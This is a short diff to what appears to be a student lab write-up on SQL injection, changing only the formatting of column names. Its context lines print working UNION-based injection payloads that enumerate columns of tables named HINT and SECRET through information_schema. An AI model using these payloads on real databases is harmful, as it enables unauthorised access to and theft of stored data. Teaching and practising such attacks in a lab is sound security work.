@@ -73,7 +73,7 @@ Or use the following alternative command
 ```
 ' UNION ALL SELECT NULL,NULL,NULL,GROUP_CONCAT(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='HINT'; -- 
 ```
-The `column_name` got from Table `HINT` are `id` and `message`
+The `column_name` got from Table `HINT` are _id_ and _message_
 
 Use the following command to get `message` from Table `HINT` with `id=1`
 ```
@@ -85,7 +85,7 @@ Use the following command to get all `Column` in Table `SECRET`
 ```
 ' UNION ALL SELECT NULL,NULL,NULL,GROUP_CONCAT(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='SECRET'; -- 
 ```
-The `column_name` got from Table `SECRET` are `hash`, `id`, and `secret`
+The `column_name` got from Table `SECRET` are _hash_, _id_, and _secret_
 
 Use the following command to get `md5(netid)`
 ```
